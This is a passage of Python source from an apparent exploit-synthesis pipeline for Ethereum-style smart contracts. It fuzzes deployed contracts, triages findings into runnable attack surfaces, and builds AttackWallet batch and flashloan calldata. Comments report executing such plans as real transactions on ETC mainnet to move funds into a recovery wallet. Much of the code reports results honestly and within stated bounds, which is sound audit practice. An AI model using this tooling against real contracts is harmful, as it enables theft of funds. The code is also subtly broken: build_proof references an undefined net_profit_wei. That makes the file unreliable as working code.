        return None  # it does not revert now (state moved on) -- no reason
    except Exception as e:  # noqa: BLE001 - deliberately broad; this is diagnostic only
        msg = str(e)
        # web3 wraps the node's `data` field; the human reason is usually the
        # last quoted string. Keep it short and single-line for the log.
        for marker in ("execution reverted:", "revert"):
            if marker in msg:
                msg = msg.split(marker, 1)[1]
                break
        msg = " ".join(msg.split())
        return msg[:300] if msg else None


def first_failing_step_index(w3: Web3, acct, attack_wallet: str, steps: list) -> "int | None":
    """W4: name WHICH step failed when an atomic executeBatch reverts.

    The batch is atomic, so the node reports one revert for the whole
    sequence and `executeBatch`'s own `Executed` events never land (a
    reverted tx emits nothing). Best-effort replay: re-run the sequence as
    one `eth_call` from the same sender, appending one `execute()` at a time,
    and return the index of the FIRST prefix that reverts -- that step is the
    one that broke. Returns None when the caller lacks eth_call visibility
    (e.g. a unit-test fake) or when nothing reverts in isolation, so the
    caller just falls back to its generic message. Never raises.

    Note (R3): a single-step `eth_call` does not reproduce an INTER-step
    dependency (an earlier step's state feeding a later one, e.g. an
    allowance), so this can under-report; it is a diagnostic, not a gate."""
    for i in range(len(steps)):
        prefix = steps[: i + 1]
        data = attack_wallet_execute_batch_calldata(
            [s["contract"] for s in prefix],
            [bytes.fromhex(s["calldata"]) for s in prefix],
            [parse_pretty_wei(s.get("value")) for s in prefix],
        )
        try:
            w3.eth.call({
                "from": acct.address,
                "to": Web3.to_checksum_address(attack_wallet),
                "data": data,
                "value": 0,
            })
        except Exception:  # noqa: BLE001 - diagnostic only; any failure = "this step"
            return i
    return None


def erc20_balance_of(w3: Web3, token: str, holder: str) -> int:
    data = selector("balanceOf(address)") + abi_encode(["address"], [Web3.to_checksum_address(holder)])
    raw = w3.eth.call({"to": Web3.to_checksum_address(token), "data": data})
    return int.from_bytes(raw, "big")


def aave_flashloan_premium_bps(w3: Web3, pool: str) -> int:
    # Read live from the real Pool contract immediately before building
    # the repayment-wrap step's calldata -- never hardcoded/guessed. Aave
    # V3's FLASHLOAN_PREMIUM_TOTAL() returns the fee in basis points
    # (1e4 == 100%); as of this writing it's 0.05% (5 bps) on every chain
    # this project targets, but reading it live means a future protocol
    # parameter change can't silently under-fund the repayment wrap step
    # below.
    raw = w3.eth.call({"to": Web3.to_checksum_address(pool), "data": selector("FLASHLOAN_PREMIUM_TOTAL()")})
    return int.from_bytes(raw, "big")


def run_static_analysis(sol_path: Path, tee: Tee) -> None:
    """Runs Slither against the target's source, if source is available.
    Static analysis finds a DIFFERENT class of issues than the fuzzer
    (e.g. a missing check on a function the fuzzer never happened to
    reach yet) in seconds, with no fuzzing time needed at all -- a cheap,
    fast second opinion before the much slower dynamic run.
    """
    tee.log(f"Running static analysis (Slither) on {sol_path.name} ...")
    out_path = sol_path.parent / f"{sol_path.stem}.slither.json"
    result = subprocess.run(
        ["slither", str(sol_path), "--solc", _find_solc(), "--json", str(out_path)],
        capture_output=True,
        text=True,
    )
    if not out_path.exists():
        tee.log(f"Slither did not produce output (exit {result.returncode}). STDERR tail:\n{result.stderr[-1500:]}")
        return
    try:
        report = json.loads(out_path.read_text())
    except json.JSONDecodeError:
        tee.log("Slither output was not valid JSON -- skipping.")
        return
    findings = (report.get("results") or {}).get("detectors") or []
    if not findings:
        tee.log("Slither: no findings.")
        return
    tee.log(f"Slither: {len(findings)} finding(s):")
    severity_order = {"High": 0, "Medium": 1, "Low": 2, "Informational": 3, "Optimization": 4}
    for f in sorted(findings, key=lambda f: severity_order.get(f.get("impact"), 9)):
        first_line = (f.get("description") or "").strip().splitlines()[0] if f.get("description") else ""
        tee.log(f"  [{f.get('impact')}/{f.get('confidence')}] {f.get('check')}: {first_line}")


# Mirrors Rust's FUND_EXTRACTION_BUG_TYPES (src/evm/solution/mod.rs) --
# bug types the fuzzer itself classifies as fund-extraction-eligible for
# atomic exploit synthesis. Kept as a separate list here (not imported,
# there's no Python/Rust shared module) so this stays a deliberate,
# visible duplication to update if the Rust list changes, not a silent
# drift risk.
FUND_EXTRACTION_BUG_TYPES = {
    "Fund Loss",
    "ERC4626 Share Inflation",
    "Unauthorized ERC20 Transfer",
    "Unauthorized NFT Transfer",
    "Unauthorized ERC1155 Transfer",
    "Imbalanced Uniswap Pair",
}


# Heuristic name match for "this function is almost certainly gated
# behind onlyOwner/authorized" -- there's no ABI field for Solidity
# modifiers, so a verified function's actual access control can't be
# determined without parsing source. Common enough naming convention
# (confirmed against two real contracts this session: authorize,
# setFeeReceiver, setSwapBackSettings, blacklistAddress, cooldownEnabled,
# AND claimOwner -- the latter found on a second real contract, where
# the fuzzer's trace correctly identified the real on-chain owner address
# via the SLOAD-harvesting fix and successfully called this owner-only
# withdraw function in simulation, which the "Fund Loss: anyone can
# earn..." framing then mislabeled as an attacker-reachable bug -- all
# confirmed to really be onlyOwner/authorized in their verified source)
# to be worth flagging, even though it will miss differently-named admin
# functions and could rarely false-positive on an unrelated public
# function that happens to share a prefix. The generic `\w*owner\w*`
# clause (added after the claimOwner miss) catches that whole family in
# one pattern instead of enumerating every "claim/set/get + Owner"
# combination by hand.
PRIVILEGED_FN_NAME_RE = re.compile(
    r"\b(claim\w*[Oo]wner\w*|set\w*[Oo]wner\w*|change\w*[Oo]wner\w*|new\w*[Oo]wner\w*|"
    r"transferOwnership|renounceOwnership|authorize|unauthorize|setFee\w*|setSwapBack\w*|"
    r"setTxLimit|setMaxWallet\w*|setSellMultiplier|setFees|blacklist\w*|tradingStatus|cooldownEnabled|"
    r"grantRole|revokeRole|pause|unpause|rescue\w*|withdrawAdmin\w*)\s*\(",
    re.IGNORECASE,
)


def count_fund_loss_findings_requiring_privilege(work_dir: Path) -> int:
    """Counts 'Fund Loss' .t.sol reproductions whose FIRST actual call
    (skipping the `vm.createSelectFork`/`setUp` boilerplate) matches
    PRIVILEGED_FN_NAME_RE -- see report_unexecuted_findings's caller for
    why this matters. Confirmed live: on one real contract, ALL 15 "Fund
    Loss" reproductions this run led with a call to authorize(), which is
    onlyOwner in the verified source.
    """
    vuln_dir = work_dir / "vulnerabilities"
    if not vuln_dir.exists():
        return 0
    count = 0
    for t_sol in vuln_dir.glob("*.t.sol"):
        text = t_sol.read_text()
        if "[Fund Loss]" not in text:
            continue
        test_fn = text.split("function test()", 1)
        if len(test_fn) < 2:
            continue
        body = test_fn[1]
        first_call = re.search(r"\)\.(\w+)\s*\(", body)
        if first_call and PRIVILEGED_FN_NAME_RE.match(first_call.group(1) + "("):
            count += 1
    return count


def report_unexecuted_findings(work_dir: Path, num_plans: int, tee: Tee) -> None:
    """Confirmed live: a severe-sounding finding (e.g. "Fund Loss: anyone
    can earn 2.5 ETH") can exist in vuln_info.jsonl with NO corresponding
    .plan.json at all -- the Rust side (src/evm/solution/mod.rs) only
    synthesizes an atomic, AttackWallet-executable plan for fund-extraction/
    reentrancy bug types AND only when the underlying trace can be
    flattened into a single caller identity. A multi-caller trace (e.g.
    the flashloan/self-liquidation discovery oracle in src/evm/oracles/
    erc20.rs, which accumulates earned-vs-owed value across the WHOLE
    fuzzed token/pair/router graph, not one atomic call sequence) is
    DISCOVERY-ONLY: real, but with no automatic path to on-chain
    confirmation or execution via this pipeline. Silently saying nothing
    about this (the previous behavior) reads exactly like "nothing else
    to worry about" instead of "found something real, can't act on it
    automatically" -- this makes that distinction impossible to miss.
    """
    vuln_file = work_dir / "vuln_info.jsonl"
    if not vuln_file.exists():
        return
    bug_type_counts: dict = {}
    for line in vuln_file.read_text().splitlines():
        try:
            bug_type = json.loads(line).get("bug_type")
        except json.JSONDecodeError:
            continue
        if bug_type:
            bug_type_counts[bug_type] = bug_type_counts.get(bug_type, 0) + 1
    if not bug_type_counts:
        return
    tee.log(f"=== Bug types found this run (across {sum(bug_type_counts.values())} raw occurrences) ===")
    for bug_type, count in sorted(bug_type_counts.items(), key=lambda kv: -kv[1]):
        extraction_tag = " [fund-extraction-eligible]" if bug_type in FUND_EXTRACTION_BUG_TYPES else ""
        tee.log(f"  {bug_type}: {count}x{extraction_tag}")
    privileged_fund_loss_count = count_fund_loss_findings_requiring_privilege(work_dir)
    if privileged_fund_loss_count:
        tee.log(
            f"NOTE: {privileged_fund_loss_count} of the 'Fund Loss'-class finding(s) above have a "
            "reproduction trace (vulnerabilities/*.t.sol) whose FIRST call matches a common "
            "admin/owner-gated function name (authorize/setFee.../setSwapBack.../blacklist.../"
            "transferOwnership/... -- heuristic name match, not a guarantee). Confirmed live on a real "
            "contract: fuzzing self-granted this privileged call successfully during exploration even "
            "though the real chain's owner is a fixed, different address -- meaning the oracle's own "
            "'Anyone can earn X ETH' wording is WRONG for these: replaying the same sequence for real, "
            "signed by a non-owner wallet, would revert on this very first call. This is a centralization- "
            "risk / 'what the owner could do with their own privileges' finding, not an externally "
            "exploitable one -- do not expect a wallet other than the real owner's to realize this value."
        )
    extraction_types_found = sorted(set(bug_type_counts) & FUND_EXTRACTION_BUG_TYPES)
    if extraction_types_found:
        tee.log(
            f"NOTE: fund-extraction-eligible bug type(s) found this run: {', '.join(extraction_types_found)}. "
            f"Only {num_plans} executable plan(s) total were generated for the ENTIRE run (across every bug "
            "type, not just these) -- a plan existing does NOT mean every fund-extraction-eligible finding "
            "above got one. Each occurrence either got its own .plan.json/.s.sol (same numbered suffix as "
            "its .t.sol, e.g. C1Bac_3.t.sol + C1Bac_3.plan.json), or it didn't because the underlying trace "
            "couldn't be flattened into one atomic, signable, single-caller sequence (most commonly: it "
            "spans multiple distinct caller addresses). A finding with no matching .plan.json is NOT a "
            "false positive -- it's real but DISCOVERY-ONLY: this pipeline has no automatic path to "
            "on-chain confirmation or execution for it. Check vulnerabilities/*.t.sol for each one's full "
            "real reproduction (with per-call vm.prank identities); confirming real impact from one "
            "without a plan requires manually constructing a single-caller-executable sequence."
        )


# The three hard pre-conditions determine_negative_result_verdict() (below)
# requires before a run is allowed to report "no vulnerability found" to a
# client. Not aesthetic defaults -- each one closes a specific way a clean
# result could silently mean "didn't look hard enough" instead of "looked
# and found nothing": a target can have the vast majority of its real
# behavior behind branches a short/narrow run never reaches (coverage
# floor), a run that exits almost immediately (crash, bad RPC, misconfigured
# target) produces a technically-nonempty but meaningless report (time
# floor), and running with a narrower --detectors selection than "all"
# silently skips whole bug classes without saying so in the final verdict
# (detector floor). All three must hold, or the run can ONLY report
# "insufficient coverage", never "safe".
MIN_COVERAGE_PCT_FOR_NEGATIVE_RESULT = 80.0
MIN_FUZZ_SECONDS_FOR_NEGATIVE_RESULT = 300

# Mirrors PLAN_CONFIRMED/PLAN_NOT_CONFIRMED/etc.'s status-constant pattern:
# the ABSENCE of a bug needs the same disciplined, non-boolean reporting as
# the PRESENCE of one. Collapsing "verified absence within a stated bound"
# and "we don't actually know" into the same silence is exactly the kind
# of overclaim this project's own CONFIRMED-rename (sim-confirmed, see
# oracle.rs) was just built to stop happening on the positive side.
SCAN_NO_BUG_BOUNDED = "no_bug_found_bounded"
SCAN_INSUFFICIENT_COVERAGE = "insufficient_coverage"


def report_surface_triage(findings: "list[dict]", tee: Tee) -> None:
    """Collapse the run's plans into distinct vulnerable surfaces and say,
    per surface, what stands between it and a runnable exploit. The fuzzer
    is right to be noisy (one ETC run turned 1022 hits into 1945 plans); a
    raw plan count tells a human nothing, whereas the count of DISTINCT
    surfaces and their viability tiers is the "what did we really find and
    what would it take to run it" answer. Pure analysis of what is already
    on disk -- no network, no chain, no wallet."""
    try:
        import triage_findings as tf
    except Exception as e:
        tee.log(f"(surface triage unavailable: {e})")
        return
    if not findings:
        return
    surfaces: dict = {}
    for finding in findings:
        key = tf.surface_key(finding)
        tier, detail = tf.classify(finding)
        entry = surfaces.get(key)
        if entry is None:
            plan = finding["plan"]
            surfaces[key] = {
                "target": plan.get("target"), "chain": plan.get("chain"),
                "bug_types": sorted(finding.get("bug_types") or []),
                "kind": plan.get("kind"), "tier": tier, "detail": detail,
                "leaked_steps": tf._leaked_steps(plan), "count": 0,
            }
        elif tf.TIER_ORDER.index(tier) < tf.TIER_ORDER.index(entry["tier"]):
            entry["tier"], entry["detail"] = tier, detail
            entry["leaked_steps"] = tf._leaked_steps(finding["plan"])
        surfaces[key]["count"] += 1

    by_tier: dict = {}
    for e in surfaces.values():
        by_tier.setdefault(e["tier"], []).append(e)
    tee.log(f"=== Surface triage: {len(findings)} plan(s) -> {len(surfaces)} distinct vulnerable surface(s) ===")
    for tier in tf.TIER_ORDER:
        entries = by_tier.get(tier)
        if not entries:
            continue
        tee.log(f"  {tier} ({len(entries)}): {tf.TIER_BLURB[tier]}")
        for e in sorted(entries, key=lambda x: -x["count"]):
            bugs = ", ".join(e["bug_types"]) or "?"
            tee.log(f"    [{e['count']:5} plan(s)] {e['target']} ({e['chain']}) kind={e['kind']} -- {bugs}: {e['detail']}")
            for s in e["leaked_steps"]:
                tee.log(f"        -> leaked call to materialize: {s['contract']}.{s['fn_selector']} (step {s['index']})")
    runnable = by_tier.get(tf.RUNNABLE) or []
    materialize = by_tier.get(tf.NEEDS_MATERIALIZATION) or []
    tee.log(
        f"  => {len(runnable)} surface(s) runnable as-is; {len(materialize)} confirmed surface(s) need "
        f"materialization (a faked call return must become a real state change) before they can be executed."
    )
    report_materialization(findings, tee)


def report_materialization(findings: "list[dict]", tee: Tee) -> None:
    """For every NEEDS_MATERIALIZATION surface, classify the exact leaked call
    and name the real state change that would replace it (see
    materialize_plan.py). Triage says WHICH call is faked; this says what to
    DO about it -- and, crucially, which leaks no state change can fix
    (AUTH_GUARD = NEEDS_PRIVILEGE; REENTRANCY_CALLBACK = a generator change,
    not a prefix). Pure analysis; no network, no chain, no wallet."""
    try:
        import materialize_plan as mp
        import triage_findings as tf
    except Exception as e:
        tee.log(f"(materialization worklist unavailable: {e})")
        return

    def tf_tier(finding):
        return tf.classify(finding)[0]

    if not findings:
        return
    groups: dict = {}
    for finding in findings:
        if tf_tier(finding) != "NEEDS_MATERIALIZATION":
            continue
        plan = finding["plan"]
        for step in mp.leaked_steps(plan):
            cls = (mp.REENTRANCY_CALLBACK if mp.is_callback_leak(step, plan)
                   else mp.classify_selector(step.get("fn_selector")))
            g = groups.setdefault(cls, {"selectors": set(), "count": 0})
            g["selectors"].add(str(step.get("fn_selector") or ""))
            g["count"] += 1
    if not groups:
        return
    tee.log("=== Materialization worklist (what replaces each faked call return) ===")
    for cls in sorted(groups, key=lambda c: (not mp.RECIPES[c][1], c)):
        g = groups[cls]
        recipe, materializable = mp.RECIPES[cls]
        flag = "materializable" if materializable else "NOT materializable"
        sels = ", ".join(sorted(s for s in g["selectors"] if s))
        tee.log(f"  {cls} ({flag}) [{g['count']} leaked call(s)]: {sels}")
        tee.log(f"      -> {recipe}")


def report_coverage(work_dir: Path, tee: Tee) -> "tuple[float, float] | tuple[None, None]":
    """Surfaces exactly how much of the target's code the fuzzer actually
    exercised, so "no bug found" can be read as "no bug found in X% of the
    code" instead of being mistaken for a guarantee. coverage.txt is
    written by forksploit itself at the end of every run.

    Returns (min_instruction_pct, min_branch_pct) -- the MINIMUM across
    every contract listed in coverage.txt, not an average: in a
    multi-contract system (proxy + implementation, AttackWallet +
    target, ...) one badly-covered contract is exactly the blind spot a
    negative-result claim can't paper over by averaging it away. Both
    are None if no coverage.txt was produced, or it had no parseable
    coverage line -- the caller (determine_negative_result_verdict)
    treats that as "can't make any bounded claim", not as 100%/0%.
    """
    cov_file = work_dir / "coverage.txt"
    if not cov_file.exists():
        tee.log("No coverage.txt found -- can't report coverage for this run.")
        return None, None
    tee.log("=== Coverage (how much of the target's code this run actually exercised) ===")
    min_instr_pct = None
    min_branch_pct = None
    for line in cov_file.read_text().splitlines():
        tee.log(line)
        try:
            if "Instruction Coverage:" in line:
                pct = float(line.split("(")[-1].rstrip("%) \n"))
                min_instr_pct = pct if min_instr_pct is None else min(min_instr_pct, pct)
            elif "Branch Coverage:" in line:
                pct = float(line.split("(")[-1].rstrip("%) \n"))
                min_branch_pct = pct if min_branch_pct is None else min(min_branch_pct, pct)
        except (ValueError, IndexError):
            pass
    if min_instr_pct is not None and min_instr_pct < MIN_COVERAGE_PCT_FOR_NEGATIVE_RESULT:
        tee.log(
            f"NOTE: instruction coverage is below {MIN_COVERAGE_PCT_FOR_NEGATIVE_RESULT}% -- treat a clean result "
            "with proportionally less confidence; a longer --fuzz-seconds run would reach more of the contract's code."
        )
    return min_instr_pct, min_branch_pct


def determine_negative_result_verdict(
    min_instr_pct: "float | None", min_branch_pct: "float | None", fuzz_seconds_actual: float,
    detectors: str, chain: str, tee: Tee,
) -> str:
    """Called only when a run's work_dir ended up with ZERO *.plan.json
    files -- i.e. no exploitable bug was found. Decides whether that
    absence is strong enough to report to a client as a bounded "no
    vulnerability found" statement, or whether it must instead be
    reported as "insufficient coverage" -- an honest "we don't know",
    never a bare, unscoped "safe". No fuzzing tool (this one included)
    can prove the absence of bugs; the best any of them can honestly
    claim is "none found within this stated amount of looking", which is
    exactly what SCAN_NO_BUG_BOUNDED spells out and SCAN_INSUFFICIENT_COVERAGE
    withholds.
    """
    reasons = []
    if min_instr_pct is None:
        reasons.append("no coverage.txt / no parseable coverage data -- the run's own exercised-code measurement is missing")
    elif min_instr_pct < MIN_COVERAGE_PCT_FOR_NEGATIVE_RESULT:
        reasons.append(f"instruction coverage only {min_instr_pct:.2f}% (need >= {MIN_COVERAGE_PCT_FOR_NEGATIVE_RESULT}%)")
    if fuzz_seconds_actual < MIN_FUZZ_SECONDS_FOR_NEGATIVE_RESULT:
        reasons.append(f"fuzz time only {fuzz_seconds_actual:.0f}s (need >= {MIN_FUZZ_SECONDS_FOR_NEGATIVE_RESULT}s)")
    if detectors != "all":
        reasons.append(f"ran with --detectors {detectors!r}, not 'all' -- some bug classes were never checked at all")

    if reasons:
        tee.log(
            "VERDICT: INSUFFICIENT COVERAGE -- this run's absence of findings CANNOT be reported to a client as "
            "'no vulnerability found': " + "; ".join(reasons) + ". Re-run with a longer --fuzz-seconds and/or "
            "--detectors all before any negative-result claim is defensible.",
            alert=True,
        )
        return SCAN_INSUFFICIENT_COVERAGE

    branch_note = f"{min_branch_pct:.2f}% branch coverage" if min_branch_pct is not None else "branch coverage unavailable"
    tee.log(
        f"VERDICT: NO VULNERABILITY FOUND (bounded) -- {min_instr_pct:.2f}% instruction coverage, {branch_note}, "
        f"{fuzz_seconds_actual:.0f}s of fuzzing, --detectors all, chain={chain}. This means: no bug within the "
        f"{min_instr_pct:.2f}% of code paths this run actually exercised, among the bug classes ForkSploit's "
        "detectors implement. It does NOT mean the contract is proven free of vulnerabilities -- report this "
        "exact, bounded scope to the client, never an unqualified 'safe'."
    )
    return SCAN_NO_BUG_BOUNDED


def run_fuzzer(
    target_address: str,
    chain: str,
    detectors: str,
    fuzz_seconds: int,
    work_dir: Path,
    tee: Tee,
    extra_targets: "list[str] | None" = None,
) -> float:
    """Returns the REAL wall-clock seconds this run actually fuzzed for --
    used by determine_negative_result_verdict() below, which must never
    trust the requested --fuzz-seconds budget as a stand-in for what
    actually happened (the binary can exit early: a crash, or finding a
    bug when --run-forever isn't passed elsewhere).

    `extra_targets` are additional already-deployed addresses to fuzz
    alongside `target_address` (comma-joined into the SAME -t list). The
    caller (auto_pipeline.main) passes the proxy IMPLEMENTATIONS that
    proxy_resolver.resolve_proxy_chain() found for the named target, so the
    implementation is fuzzed directly and not just reached through the
    proxy's ~45-byte dispatcher. from_address() in the Rust layer also
    expands any address here to its own implementation(s) and dedupes, so
    passing a proxy or a plain contract is equally correct."""
    binary = REPO_ROOT / "target" / "release" / "forksploit"
    all_targets = [target_address] + [t for t in (extra_targets or []) if t]
    cmd = [
        str(binary),
        "evm",
        "-t",
        ",".join(all_targets),
        "-c",
        chain,
        "-f",
        "-d",
        detectors,
        "-w",
        str(work_dir),
        # Without this, the binary exits the instant it finds its FIRST
        # bug (see fuzzer.rs's default behavior) -- a target with several
        # independent vulnerabilities would only ever get one of them
        # found and scripted, no matter how much of --fuzz-seconds was
        # left. This is what actually lets `work_dir/vulnerabilities/`
        # end up with more than one *.plan.json per run.
        "--run-forever",
        # Explicit choice: precision over raw exec/sec. Without this,
        # branch conditions a pure coverage-guided mutator essentially
        # never guesses by chance (e.g. `require(x*2+12 == <huge
        # constant>)`, see tests/evm/concolic-1) go unexplored for the
        # entire run. Z3 solving is genuinely slower per corpus item, but
        # that's the tradeoff being made on purpose here, not an
        # oversight -- see concolic_stage.rs's own ConcolicStage::perform
        # for exactly where the cost comes from.
        "--concolic",
        "--concolic-caller",
    ]
    # ETC and Mordor (same client/consensus rules, just different
    # networks) both need --spec-id Shanghai -- the Rust binary's own
    # evm_fuzzer.rs only ever WARNS (non-fatal, easy to miss in a long
    # automated run's output) if this is missing, which is why the fully
    # automated pipeline needs to just always get this right itself
    # instead of relying on an operator to notice the warning and
    # intervene. Every other chain keeps the binary's own default.
    if chain in ("etc", "mordor"):
        cmd += ["--spec-id", "Shanghai"]
    # The Rust binary picks its own default RPC per chain
    # (src/evm/onchain/endpoints.rs) independently of chains.py -- an RPC
    # override set here (chains.py's rpc_overrides.json, e.g. via
    # forksploit.sh's RPC prompt) would otherwise never reach it. Setting
    # ETH_RPC_URL is how to actually hand it one: endpoints.rs's
    # get_chain_rpc() reads that env var unconditionally for every chain
    # (the same cast/forge convention this project's own tests rely on),
    # not just ETH's.
    env = dict(os.environ)
    env["ETH_RPC_URL"] = get_rpc_url(chain)
    tee.log(f"Running fuzzer for up to {fuzz_seconds}s (RPC: {env['ETH_RPC_URL']}): {' '.join(cmd)}")
    proc = subprocess.Popen(
        cmd, cwd=str(REPO_ROOT), env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
    )
    start = time.time()
    try:
        while True:
            line = proc.stdout.readline()
            if line:
                tee.log(f"[fuzzer] {line.rstrip()}")
            if proc.poll() is not None:
                break
            if time.time() - start > fuzz_seconds:
                tee.log(f"Fuzz time budget ({fuzz_seconds}s) reached, stopping fuzzer.")
                proc.terminate()
                try:
                    proc.wait(timeout=10)
                except subprocess.TimeoutExpired:
                    proc.kill()
                break
    except KeyboardInterrupt:
        proc.terminate()
        raise
    return time.time() - start


# execute_plan's four possible outcomes -- deliberately not a plain
# bool. "Not confirmed" (a real attempt was made and it reverted) and
# "inconclusive" (no real attempt was possible, e.g. unfundable) are NOT
# the same signal: the first is evidence the trace isn't a real/reachable
# bug (or needs different preconditions), the second says nothing about
# the bug either way. Collapsing both into "False" would tell the caller
# a skipped-for-funding-reasons plan "failed" exactly like a genuinely
# reverted one, actively misleading anyone using this to decide what in
# the contract is worth fixing.
PLAN_CONFIRMED = "confirmed"
PLAN_NOT_CONFIRMED = "not_confirmed"
PLAN_INCONCLUSIVE = "inconclusive"
# A plan can run every step without a single revert and still move zero
# real value -- the fuzzer may have found only a primitive (e.g. a
# reentrancy callback that fires but drains nothing), not the most
# profitable variant. Treating that as PLAN_CONFIRMED would let a client
# report claim funds were extracted when the recovery wallet's own
# on-chain balance says otherwise. This status exists specifically so
# "every call succeeded" and "money actually landed on the recovery
# wallet" can never be conflated in anything this pipeline reports.
PLAN_EXECUTED_NO_PROFIT = "executed_no_profit"
# A plan skipped BEFORE any real transaction was signed, because a free
# pre-flight (a fork simulation, or the plan's own metadata) already showed
# it cannot come out ahead -- either the replay reverts, or it moves value
# but costs more gas than it recovers. Confirmed live on ETC mainnet: 10 of
# 11 plans in one run executed cleanly and recovered nothing, one of them
# burning 7,878,136 gas (~0.0206 ETC) to move zero -- and that entire cost
# was already knowable from the free estimate before the tx was ever sent.
# This status is deliberately distinct from PLAN_EXECUTED_NO_PROFIT (which
# paid real gas to learn the same thing) and from PLAN_INCONCLUSIVE (which
# could not decide). Nothing is spent to reach it.
PLAN_SKIPPED_UNPROFITABLE = "skipped_unprofitable"
# A plan skipped BEFORE any real transaction was signed, because the plan's
# own metadata says it is not a runnable extraction at all: it is a
# Review-tier heuristic finding (confirmed_exploitable=false -- no oracle
# ever observed real fund movement), or its trace cannot be replayed by
# AttackWallet (a faked return value, or more than one caller). This is the
# "we found the bug, but there is no extraction step to run" case, which is
# a genuinely different statement from PLAN_SKIPPED_UNPROFITABLE ("there IS
# an extraction step, and a fork proved it cannot out-earn its gas"). Kept
# separate so a report can never imply a heuristic was a real, attempted
# exploit -- confirmed live on ETC mainnet, where 1022 "Stale Guard Counter"
# hits produced 805 plans that all ran cleanly and none of which moved a wei.
PLAN_SKIPPED_NOT_EXTRACTABLE = "skipped_not_extractable"
# A plan skipped BEFORE any real transaction was signed, because its OWN
# measured gas footprint cannot fit in a block. The revm model has no gas
# metering (CLAUDE.md), so a trace that is valid in an idealised,
# unlimited-gas simulation can be physically un-includable on-chain -- this
# is exactly the real ETC mainnet incident (plan C9f53_2): the Rust side
# said "Confirmed", the real send then failed with "exceeds block gas
# limit" (~49.6M gas needed vs an 8,000,000 block limit). PHASE 1.3 requires
# such a plan to be FLAGGED (oversized_gas), not executed. Kept separate
# from PLAN_SKIPPED_UNPROFITABLE ("it runs but costs more than it earns")
# because "it cannot physically fit in a block" is a different, stronger
# statement about why the plan was never sent.
PLAN_OVERSIZED_GAS = "oversized_gas"

# PHASE 7 / TASK_SPEC.md §3: `chain-verified` is the highest
# confidence tier, reserved EXCLUSIVELY for a plan that was actually
# executed on a real chain AND moved real assets -- measured, not
# estimated. It is deliberately NOT a stored status: it is derived here
# from the two independent signals a CONFIRMED plan already carries, so it
# is structurally impossible to award it without a real, measured asset
# movement. A simulation ("sim-confirmed"), a fork replay, or a clean-but-
# zero execution (PLAN_EXECUTED_NO_PROFIT) can never reach this tier.
def is_chain_verified(status: str, recovery_delta_wei: int) -> bool:
    """True only when `status` is PLAN_CONFIRMED (the recovery wallet's own
    on-chain balance was observed to increase by this plan's own measured
    delta) AND that delta is strictly positive. Both are required; either
    one alone is not enough."""
    return status == PLAN_CONFIRMED and recovery_delta_wei > 0


@dataclass
class Proof:
    """PHASE 5.2 of TASK_SPEC.md: the three proof gates
    (state replay, gas reality, independence from lies) collapsed into ONE
    structured, machine-readable object -- `{replayed, gas_used,
    net_profit_wei, blockers}` -- instead of scattered booleans a reader
    has to reconstruct.

    It is a pure VIEW over signals the pipeline already computes; it makes
    no new chain call and decides nothing on its own. `blockers` names
    every reason the plan did NOT clear the gates, so a rejection is
    explained rather than silently dropped (task spec §6.8: "No hiding of
    errors")."""
    # (a) state replay: the plan's exact steps landed against real state.
    replayed: bool
    # (b) gas reality: real gas units this plan cost (0 when never sent).
    gas_used: int
    # (c) independence from lies: no control leak, no owner impersonation,
    # no multi-caller trace -- i.e. nothing AttackWallet cannot reproduce.
    independent: bool
    # The honest bottom line in wei (may be negative -- a net loss).
    net_profit_wei: int
    # Highest confidence tier this run earned (see is_chain_verified).
    chain_verified: bool
    # Every gate that FAILED, in words; empty when the plan passed them all.
    blockers: list = field(default_factory=list)

    def to_dict(self) -> dict:
        return asdict(self)


def build_proof(
    finding: dict, status: str, recovery_delta_wei: int, gas_spent_wei: int, net_profit: int,
    gas_units: int = 0,
) -> Proof:
    """Builds the structured proof for one plan from the signals the
    pipeline already has: the finding's own metadata (state-replay and
    independence flags the fuzzer stamped, or a composed plan's defaults),
    the gate's decision (`status`), and the measured gas/profit numbers.

    `blockers` is derived so the report can say WHY a plan is not
    chain-verified: a reverted replay, an owner-impersonation caller, a
    control-leak dependency, a multi-caller trace, or simply a net loss."""
    blockers: list = []
    plan = finding.get("plan") or {}

    def _flag(name: str, default):
        """Read a flag from the finding's top level, falling back to the
        plan dict (where the Rust layer authoritatively stamps it -- e.g.
        `owner_impersonation`, which `load_findings` does not copy up)."""
        if name in finding:
            return finding[name]
        return plan.get(name, default)

    # (c) independence from lies -- checked first, because a plan that
    # relies on any of these can never be an exploit no matter what the
    # other gates say.
    if _flag("owner_gated", False):
        # PHASE 3.2: the SEMANTIC shape -- the trace calls the target AS an
        # identity harvested from that contract's own storage, i.e.
        # `require(msg.sender == owner)` satisfied by impersonation. The
        # most specific form, so it takes precedence over the broad flag.
        blockers.append(
            "owner_gated: the trace calls the target AS an identity harvested from that contract's own "
            "storage -- exactly require(msg.sender == owner) satisfied by impersonation, not an attacker"
        )
    elif _flag("owner_impersonation", False):
        blockers.append(
            "owner_impersonation: the caller is an identity harvested from the target's own storage "
            "(owner/admin/multisig), not a real attacker"
        )
    if not _flag("atomic_replayable", True):
        blockers.append(
            "not atomic_replayable: discovery relied on a faked/intercepted call return that "
            "AttackWallet cannot reproduce"
        )
    if int(_flag("distinct_callers", 1) or 1) > 1:
        blockers.append(
            f"multi-caller trace ({int(_flag('distinct_callers', 1) or 1)} distinct callers): "
            "AttackWallet drives every step from one signer"
        )
    independent = not blockers

    replayed = status == PLAN_CONFIRMED
    chain_verified = is_chain_verified(status, recovery_delta_wei)
    if not replayed:
        blockers.append(
            {
                PLAN_NOT_CONFIRMED: "state replay reverted against real state",
                PLAN_INCONCLUSIVE: "state replay not attempted (inconclusive)",
                PLAN_EXECUTED_NO_PROFIT: "steps succeeded but no real assets moved",
                PLAN_SKIPPED_UNPROFITABLE: "pre-flight proved it cannot out-earn its own gas",
                PLAN_SKIPPED_NOT_EXTRACTABLE: "no runnable extraction step to replay",
                PLAN_OVERSIZED_GAS: "measured gas footprint exceeds the block gas limit (oversized_gas)",
            }.get(status, f"state replay did not confirm (status={status})")
        )
    elif not chain_verified:
        # Confirmed and replayable, but the measured delta did not clear
        # zero -- impossible for a real CONFIRMED status, kept honest anyway.
        blockers.append("confirmed but the measured recovery delta was not strictly positive")

    return Proof(
        replayed=replayed,
        gas_used=gas_units,
        independent=independent,
        net_profit_wei=net_profit_wei,
        chain_verified=chain_verified,
        blockers=blockers,
    )


def skip_status_for(reason: str) -> str:
    """Which SKIPPED_* status a `preflight_skip_reason` string implies.
